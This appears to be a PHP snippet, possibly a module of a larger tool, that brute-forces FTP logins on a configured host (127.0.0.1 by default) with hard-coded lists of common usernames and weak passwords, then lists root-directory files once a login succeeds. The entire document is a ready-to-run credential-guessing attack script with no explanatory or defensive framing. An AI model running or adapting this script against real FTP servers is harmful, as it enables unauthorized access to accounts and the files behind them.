ob_start();

if (!function_exists('ftp_connect')) {
    ob_end_clean();
    return "ERROR: FTP functions not available";
}

$host = '127.0.0.1';
$port = 21;
$delay = 1;
$timeout = 1;

$usernames = ['anonymous', 'admin', 'root', 'user', 'ftp', 'test'];
$passwords = [
    '',
    'anonymous',
    'password',
    '123456',
    'admin',
    'root',
    'ftp',
    'guest',
    '12345',
    '123456789'
];

try {

    $temp_conn = @ftp_connect($host, $port, $timeout);
    if (!$temp_conn) {
        ob_end_clean();
        return "ERROR: Cannot connect to FTP ($host:$port) - service down or filtered";
    }
    @ftp_close($temp_conn);

    $output = "[+] FTP brute-force started on $host:$port\n";
    $output .= "[+] Users to try: " . count($usernames) . "\n";
    $output .= "[+] Passwords per user: " . count($passwords) . "\n\n";

    $total = 0;
    $found = false;

    foreach ($usernames as $user) {
        foreach ($passwords as $pass) {
            $total++;
            $output .= "[$total] Trying: $user / " . ($pass === '' ? '(empty)' : $pass) . " ... ";

            $conn = @ftp_connect($host, $port, $timeout);
            if (!$conn) {
                ob_end_clean();
                return "ERROR: FTP connection lost during brute-force";
            }

            $login = @ftp_login($conn, $user, $pass);
            if ($login) {
                $output .= "SUCCESS!\n";
                $output .= "\n[+] CREDENTIALS FOUND:\n";
                $output .= "    Host: $host:$port\n";
                $output .= "    User: $user\n";
                $output .= "    Pass: " . ($pass === '' ? '(empty)' : $pass) . "\n\n";

                $files = @ftp_nlist($conn, '/');
                if ($files === false) {
                    $files = @ftp_nlist($conn, '.');
                }

                if ($files && is_array($files)) {
                    $output .= "[+] Files in root directory (first 20):\n";
                    $output .= "    - " . implode("\n    - ", array_slice($files, 0, 20));
                    if (count($files) > 20) {
                        $output .= "\n    ... (+ " . (count($files) - 20) . " more)";
                    }
                } else {
                    $output .= "[+] Login OK, but directory listing failed (permissions?)\n";
                }

                @ftp_close($conn);
                $found = true;
                break 2; // sortir des deux boucles
            }

            @ftp_close($conn);
            if (!$found && $total < (count($usernames) * count($passwords))) {
                sleep($delay);
            }
        }
    }

    if (!$found) {
        $output .= "\n[!] No valid credentials found.\n";
    }

    ob_end_clean();
    return $output;

} catch (Exception $e) {
    ob_end_clean();
    return "ERROR: FTP brute-force failed - " . $e->getMessage();
}
